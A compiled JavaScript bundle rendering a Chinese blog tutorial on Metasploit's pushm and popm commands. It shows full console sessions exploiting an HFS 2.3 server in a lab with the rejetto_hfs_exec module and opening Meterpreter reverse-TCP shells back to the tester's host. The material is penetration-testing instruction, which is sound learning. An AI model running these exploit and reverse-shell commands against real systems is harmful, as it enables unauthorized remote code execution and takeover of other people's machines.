(window.webpackJsonp=window.webpackJsonp||[]).push([[312],{604:function(s,e,n){"use strict";n.r(e);var t=n(7),a=Object(t.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"metasploit之pushm和popm命令"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#metasploit之pushm和popm命令"}},[s._v("#")]),s._v(" Metasploit之pushm和popm命令")]),s._v(" "),e("p",[s._v("使用pushm命令可以将当前模块放入模块栈中，而popm将位于栈顶的模块弹出。优势在于可以实现快捷操作，从而为测试者节省大量的时间和精力。")]),s._v(" "),e("p",[s._v("这里考虑一个场景：我们正在测试一台有多种漏洞的内部网络服务器，而且要对其中的所有系统都进行两种不同的渗透测试。为了能对每台服务器都进行这两种测试，我们就需要一个能在这两个渗透模块之间快速切换的机制。在这种情况下就可以使用pushm和popm命令。我们可以使用一个渗透模块对服务器的某个漏洞进行测试，然后将这个模块放入模块栈中，操作完成之后再载入另一个渗透模块。使用第二个模块完成任务之后，就可以使用popm命令将第一个模块(仍然保持之前的所有选项设置)从栈中弹出。")]),s._v(" "),e("p",[s._v("这里，我们在目标机上部署了HFS2.3服务，如下图：")]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190127204454193.png",loading:"lazy"}})]),s._v(" "),e("p",[s._v("接着，我们利用HFS 2.3的漏洞拿到目标机的Meterpreter。")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("msfconsole\nmsf5 > use exploit/windows/http/rejetto_hfs_exec\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RHOST 192.168.175.130\nRHOST => 192.168.175.130\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080\nRPORT => 8080\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf5 exploit(windows/http/rejetto_hfs_exec) > set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nmsf5 exploit(windows/http/rejetto_hfs_exec) > exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n[*] Using URL: http://0.0.0.0:8080/SM65nXQp\n[*] Local IP: http://192.168.175.128:8080/SM65nXQp\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Payload request received: /SM65nXQp\n[*] Meterpreter session 1 opened (192.168.175.128:4444 -> 192.168.175.130:1042) at 2019-01-25 15:41:58 +0800\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 2 opened (192.168.175.128:4444 -> 192.168.175.130:1051) at 2019-01-25 15:41:58 +0800\n[!] Tried to delete %TEMP%\\GjPFpxreCevs.vbs, unknown result\n[*] Server stopped.\n\nmeterpreter >\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br")])]),e("p",[s._v("接着，我们通过background命令将当前会话放入后台，利用pushm命令将模块放入栈中，然后利用 exploit/multi/handler 模块渗透目标主机，如下：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("meterpreter > background\n[*] Backgrounding session 2...\nmsf5 exploit(windows/http/rejetto_hfs_exec) > pushm \nmsf5 exploit(windows/http/rejetto_hfs_exec) > use exploit/multi/handler \nmsf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf5 exploit(multi/handler) > show options\n\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST                      yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n\n\nmsf5 exploit(multi/handler) > set LHOST 192.168.175.128\nLHOST => 192.168.175.128\nmsf5 exploit(multi/handler) > exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 3 opened (192.168.175.128:4444 -> 192.168.175.130:1054) at 2019-01-25 15:46:53 +0800\n\nmeterpreter > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br")])]),e("p",[s._v("此时，我们就使用 pushm 命令将 windows/http/rejetto_hfs_exec 模块放到了栈中。并加载了 exploit/multi/handler 模块。当使用 exploit/multi/handler 模块完成操作之后，就可以使用popm命令从栈中再次加载 windows/http/rejetto_hfs_exec 模块，如下所示：")]),s._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[s._v("meterpreter > background\n[*] Backgrounding session 3...\nmsf5 exploit(multi/handler) > popm\nmsf5 exploit(windows/http/rejetto_hfs_exec) > show options\n\nModule options (exploit/windows/http/rejetto_hfs_exec):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   HTTPDELAY  10               no        Seconds to wait before terminating web server\n   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]\n   RHOSTS     192.168.175.130  yes       The target address range or CIDR identifier\n   RPORT      8080             yes       The target port (TCP)\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL/TLS for outgoing connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   TARGETURI  /                yes       The path of the web application\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     192.168.175.128  yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(windows/http/rejetto_hfs_exec) > exploit\n\n[*] Started reverse TCP handler on 192.168.175.128:4444 \n[*] Using URL: http://0.0.0.0:8080/8rkX9sv1CkhYsB\n[*] Local IP: http://192.168.175.128:8080/8rkX9sv1CkhYsB\n[*] Server started.\n[*] Sending a malicious request to /\n[*] Payload request received: /8rkX9sv1CkhYsB\n[*] Sending stage (179779 bytes) to 192.168.175.130\n[*] Meterpreter session 4 opened (192.168.175.128:4444 -> 192.168.175.130:1067) at 2019-01-25 16:23:11 +0800\n\n[*] Server stopped.\n[!] This exploit may require manual cleanup of '%TEMP%\\gWZaxa.vbs' on the target\n\nmeterpreter > \n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br"),e("span",{staticClass:"line-number"},[s._v("5")]),e("br"),e("span",{staticClass:"line-number"},[s._v("6")]),e("br"),e("span",{staticClass:"line-number"},[s._v("7")]),e("br"),e("span",{staticClass:"line-number"},[s._v("8")]),e("br"),e("span",{staticClass:"line-number"},[s._v("9")]),e("br"),e("span",{staticClass:"line-number"},[s._v("10")]),e("br"),e("span",{staticClass:"line-number"},[s._v("11")]),e("br"),e("span",{staticClass:"line-number"},[s._v("12")]),e("br"),e("span",{staticClass:"line-number"},[s._v("13")]),e("br"),e("span",{staticClass:"line-number"},[s._v("14")]),e("br"),e("span",{staticClass:"line-number"},[s._v("15")]),e("br"),e("span",{staticClass:"line-number"},[s._v("16")]),e("br"),e("span",{staticClass:"line-number"},[s._v("17")]),e("br"),e("span",{staticClass:"line-number"},[s._v("18")]),e("br"),e("span",{staticClass:"line-number"},[s._v("19")]),e("br"),e("span",{staticClass:"line-number"},[s._v("20")]),e("br"),e("span",{staticClass:"line-number"},[s._v("21")]),e("br"),e("span",{staticClass:"line-number"},[s._v("22")]),e("br"),e("span",{staticClass:"line-number"},[s._v("23")]),e("br"),e("span",{staticClass:"line-number"},[s._v("24")]),e("br"),e("span",{staticClass:"line-number"},[s._v("25")]),e("br"),e("span",{staticClass:"line-number"},[s._v("26")]),e("br"),e("span",{staticClass:"line-number"},[s._v("27")]),e("br"),e("span",{staticClass:"line-number"},[s._v("28")]),e("br"),e("span",{staticClass:"line-number"},[s._v("29")]),e("br"),e("span",{staticClass:"line-number"},[s._v("30")]),e("br"),e("span",{staticClass:"line-number"},[s._v("31")]),e("br"),e("span",{staticClass:"line-number"},[s._v("32")]),e("br"),e("span",{staticClass:"line-number"},[s._v("33")]),e("br"),e("span",{staticClass:"line-number"},[s._v("34")]),e("br"),e("span",{staticClass:"line-number"},[s._v("35")]),e("br"),e("span",{staticClass:"line-number"},[s._v("36")]),e("br"),e("span",{staticClass:"line-number"},[s._v("37")]),e("br"),e("span",{staticClass:"line-number"},[s._v("38")]),e("br"),e("span",{staticClass:"line-number"},[s._v("39")]),e("br"),e("span",{staticClass:"line-number"},[s._v("40")]),e("br"),e("span",{staticClass:"line-number"},[s._v("41")]),e("br"),e("span",{staticClass:"line-number"},[s._v("42")]),e("br"),e("span",{staticClass:"line-number"},[s._v("43")]),e("br"),e("span",{staticClass:"line-number"},[s._v("44")]),e("br"),e("span",{staticClass:"line-number"},[s._v("45")]),e("br"),e("span",{staticClass:"line-number"},[s._v("46")]),e("br"),e("span",{staticClass:"line-number"},[s._v("47")]),e("br"),e("span",{staticClass:"line-number"},[s._v("48")]),e("br"),e("span",{staticClass:"line-number"},[s._v("49")]),e("br"),e("span",{staticClass:"line-number"},[s._v("50")]),e("br"),e("span",{staticClass:"line-number"},[s._v("51")]),e("br"),e("span",{staticClass:"line-number"},[s._v("52")]),e("br"),e("span",{staticClass:"line-number"},[s._v("53")]),e("br")])]),e("p",[s._v("从模块栈中弹出的windows/http/rejetto_hfs_exec跟之前的设置一样，所以无须再设置这个模块的选项了。")]),s._v(" "),e("h2",{attrs:{id:"写在最后"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),e("blockquote",[e("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),e("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),e("p",[e("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);e.default=a.exports}}]);